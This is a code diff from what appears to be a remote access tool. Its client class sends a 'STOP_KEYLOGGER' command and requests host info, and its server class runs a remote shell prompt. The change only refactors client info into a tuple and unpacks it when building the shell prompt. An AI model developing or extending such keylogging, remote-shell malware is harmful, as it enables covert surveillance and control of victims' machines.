@@ -363,17 +363,17 @@ class Client(object):
         self.send(json_dumps(['STOP_KEYLOGGER']))
         return json_loads(self.receive())
 
-    def _get_info(self) -> list:
+    def _get_info(self) -> tuple:
         """ Get Client Info """
 
-        # returns [
+        # returns (
         #     platform.system(),
         #     os.path.expanduser('~'),
         #     getpass.getlogin()
-        # ]
+        # )
 
         self.send(json_dumps(['_INFO']))
-        return json_loads(self.receive())
+        return tuple(json_loads(self.receive()))
 
     def info(self, _print=True) -> str:
         """ Get Client Info """
@@ -490,14 +490,14 @@ class MultiServer(object):
         """ Remote Shell Interface """
         # returns None
         command = ''
-        info = client._get_info()
+        system, home, user = client._get_info()
         hostname = client.address[-1]
 
         while 1:
             cwd = client.get_cwd()
-            if not info[0] == 'Windows':
-                cwd = cwd.replace(info[1], '~')
-                _input = '{0}@{1}:{2}$ '.format(info[2], hostname, cwd)
+            if not system == 'Windows':
+                cwd = cwd.replace(home, '~')
+                _input = '{0}@{1}:{2}$ '.format(user, hostname, cwd)
             else:
                 _input = '{0}>'.format(cwd)
 
